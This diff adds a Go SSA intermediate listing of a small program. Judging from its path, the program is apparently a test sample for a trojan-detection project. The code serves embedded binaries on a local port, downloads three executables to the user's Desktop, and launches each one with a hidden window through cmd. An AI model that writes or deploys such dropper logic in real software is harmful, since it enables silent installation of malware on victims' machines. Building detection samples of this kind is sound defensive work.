@@ -1,0 +1,207 @@
+# Name: command-line-arguments.init
+# Package: command-line-arguments
+# Synthetic: package initializer
+func init():
+0:                                                                entry P:0 S:2
+	t0 = *init$guard                                                   bool
+	if t0 goto 2 else 1
+1:                                                           init.start P:1 S:1
+	*init$guard = true:bool
+	t1 = net/http.init()                                                 ()
+	t2 = github.com/gobuffalo/packr.init()                               ()
+	t3 = io.init()                                                       ()
+	t4 = os/exec.init()                                                  ()
+	t5 = fmt.init()                                                      ()
+	t6 = os.init()                                                       ()
+	t7 = syscall.init()                                                  ()
+	t8 = os/user.init()                                                  ()
+	t9 = log.init()                                                      ()
+	jump 2
+2:                                                            init.done P:2 S:0
+	return
+
+# Name: command-line-arguments.main
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test.go:17:6
+func main():
+0:                                                                entry P:0 S:2
+	go HostFiles()
+	t0 = os/user.Current()                           (*os/user.User, error)
+	t1 = extract t0 #0                                        *os/user.User
+	t2 = extract t0 #1                                                error
+	t3 = t2 != nil:error                                               bool
+	if t3 goto 1 else 2
+1:                                                              if.then P:1 S:1
+	t4 = new [1]any (varargs)                                       *[1]any
+	t5 = &t4[0:int]                                                    *any
+	t6 = change interface any <- error (t2)                             any
+	*t5 = t6
+	t7 = slice t4[:]                                                  []any
+	t8 = log.Println(t7...)                                              ()
+	jump 2
+2:                                                              if.done P:2 S:2
+	t9 = &t1.HomeDir [#4]                                           *string
+	t10 = *t9                                                        string
+	t11 = new [1]any (varargs)                                      *[1]any
+	t12 = &t11[0:int]                                                  *any
+	t13 = make any <- string (t10)                                      any
+	*t12 = t13
+	t14 = slice t11[:]                                                []any
+	t15 = fmt.Println(t14...)                            (n int, err error)
+	t16 = &t1.HomeDir [#4]                                          *string
+	t17 = *t16                                                       string
+	t18 = t17 + "\\Desktop\\e.exe":string                            string
+	t19 = &t1.HomeDir [#4]                                          *string
+	t20 = *t19                                                       string
+	t21 = t20 + "\\Desktop\\o.exe":string                            string
+	t22 = &t1.HomeDir [#4]                                          *string
+	t23 = *t22                                                       string
+	t24 = t23 + "\\Desktop\\s.exe":string                            string
+	t25 = DownloadFile(t18, "http://127.0.0.1:...":string)            error
+	t26 = DownloadFile(t21, "http://127.0.0.1:...":string)            error
+	t27 = DownloadFile(t24, "http://127.0.0.1:...":string)            error
+	t28 = new [2]string (varargs)                                *[2]string
+	t29 = &t28[0:int]                                               *string
+	*t29 = "/C":string
+	t30 = &t28[1:int]                                               *string
+	*t30 = t24
+	t31 = slice t28[:]                                             []string
+	t32 = os/exec.Command("cmd":string, t31...)                *os/exec.Cmd
+	t33 = new syscall.SysProcAttr (complit)            *syscall.SysProcAttr
+	t34 = &t33.HideWindow [#0]                                        *bool
+	*t34 = true:bool
+	t35 = &t32.SysProcAttr [#8]                       **syscall.SysProcAttr
+	*t35 = t33
+	t36 = (*os/exec.Cmd).Start(t32)                                   error
+	t37 = t36 != nil:error                                             bool
+	if t37 goto 3 else 4
+3:                                                              if.then P:1 S:1
+	t38 = new [1]any (varargs)                                      *[1]any
+	t39 = &t38[0:int]                                                  *any
+	t40 = change interface any <- error (t36)                           any
+	*t39 = t40
+	t41 = slice t38[:]                                                []any
+	t42 = log.Println(t41...)                                            ()
+	jump 4
+4:                                                              if.done P:2 S:2
+	t43 = new [2]string (varargs)                                *[2]string
+	t44 = &t43[0:int]                                               *string
+	*t44 = "/C":string
+	t45 = &t43[1:int]                                               *string
+	*t45 = t18
+	t46 = slice t43[:]                                             []string
+	t47 = os/exec.Command("cmd":string, t46...)                *os/exec.Cmd
+	t48 = new syscall.SysProcAttr (complit)            *syscall.SysProcAttr
+	t49 = &t48.HideWindow [#0]                                        *bool
+	*t49 = true:bool
+	t50 = &t47.SysProcAttr [#8]                       **syscall.SysProcAttr
+	*t50 = t48
+	t51 = (*os/exec.Cmd).Start(t47)                                   error
+	t52 = t51 != nil:error                                             bool
+	if t52 goto 5 else 6
+5:                                                              if.then P:1 S:1
+	t53 = new [1]any (varargs)                                      *[1]any
+	t54 = &t53[0:int]                                                  *any
+	t55 = change interface any <- error (t51)                           any
+	*t54 = t55
+	t56 = slice t53[:]                                                []any
+	t57 = log.Println(t56...)                                            ()
+	jump 6
+6:                                                              if.done P:2 S:2
+	t58 = new [2]string (varargs)                                *[2]string
+	t59 = &t58[0:int]                                               *string
+	*t59 = "/C":string
+	t60 = &t58[1:int]                                               *string
+	*t60 = t21
+	t61 = slice t58[:]                                             []string
+	t62 = os/exec.Command("cmd":string, t61...)                *os/exec.Cmd
+	t63 = new syscall.SysProcAttr (complit)            *syscall.SysProcAttr
+	t64 = &t63.HideWindow [#0]                                        *bool
+	*t64 = true:bool
+	t65 = &t62.SysProcAttr [#8]                       **syscall.SysProcAttr
+	*t65 = t63
+	t66 = (*os/exec.Cmd).Start(t62)                                   error
+	t67 = t66 != nil:error                                             bool
+	if t67 goto 7 else 8
+7:                                                              if.then P:1 S:1
+	t68 = new [1]any (varargs)                                      *[1]any
+	t69 = &t68[0:int]                                                  *any
+	t70 = change interface any <- error (t66)                           any
+	*t69 = t70
+	t71 = slice t68[:]                                                []any
+	t72 = log.Println(t71...)                                            ()
+	jump 8
+8:                                                              if.done P:2 S:0
+	return
+
+# Name: command-line-arguments.HostFiles
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test.go:55:6
+func HostFiles():
+0:                                                                entry P:0 S:0
+	t0 = github.com/gobuffalo/packr.NewBox("./bin":string) github.com/gobuffalo/packr.Box
+	t1 = make net/http.FileSystem <- github.com/gobuffalo/packr.Box (t0) net/http.FileSystem
+	t2 = net/http.FileServer(t1)                           net/http.Handler
+	t3 = net/http.Handle("/":string, t2)                                 ()
+	t4 = net/http.ListenAndServe(":3001":string, nil:net/http.Handler) error
+	return
+
+# Name: command-line-arguments.DownloadFile
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test.go:61:6
+# Recover: 3
+# Locals:
+#   0:	t0 error
+func DownloadFile(filepath string, url string) error:
+0:                                                                entry P:0 S:2
+	t0 = local error ()                                              *error
+	t1 = os.Create(filepath)                              (*os.File, error)
+	t2 = extract t1 #0                                             *os.File
+	t3 = extract t1 #1                                                error
+	t4 = t3 != nil:error                                               bool
+	if t4 goto 1 else 2
+1:                                                              if.then P:1 S:0
+	*t0 = t3
+	rundefers
+	t5 = *t0                                                          error
+	return t5
+2:                                                              if.done P:1 S:2
+	defer (*os.File).Close(t2)
+	t6 = net/http.Get(url)             (resp *net/http.Response, err error)
+	t7 = extract t6 #0                                   *net/http.Response
+	t8 = extract t6 #1                                                error
+	t9 = t8 != nil:error                                               bool
+	if t9 goto 4 else 5
+3:                                                              recover P:0 S:0
+	t10 = *t0                                                         error
+	return t10
+4:                                                              if.then P:1 S:0
+	*t0 = t8
+	rundefers
+	t11 = *t0                                                         error
+	return t11
+5:                                                              if.done P:1 S:2
+	t12 = &t7.Body [#6]                                      *io.ReadCloser
+	t13 = *t12                                                io.ReadCloser
+	defer invoke t13.Close()
+	t14 = &t7.Body [#6]                                      *io.ReadCloser
+	t15 = *t14                                                io.ReadCloser
+	t16 = make io.Writer <- *os.File (t2)                         io.Writer
+	t17 = change interface io.Reader <- io.ReadCloser (t15)       io.Reader
+	t18 = io.Copy(t16, t17)                      (written int64, err error)
+	t19 = extract t18 #0                                              int64
+	t20 = extract t18 #1                                              error
+	t21 = t20 != nil:error                                             bool
+	if t21 goto 6 else 7
+6:                                                              if.then P:1 S:0
+	*t0 = t20
+	rundefers
+	t22 = *t0                                                         error
+	return t22
+7:                                                              if.done P:1 S:0
+	t23 = println("Downloaded file":string)                              ()
+	*t0 = nil:error
+	rundefers
+	t24 = *t0                                                         error
+	return t24
+
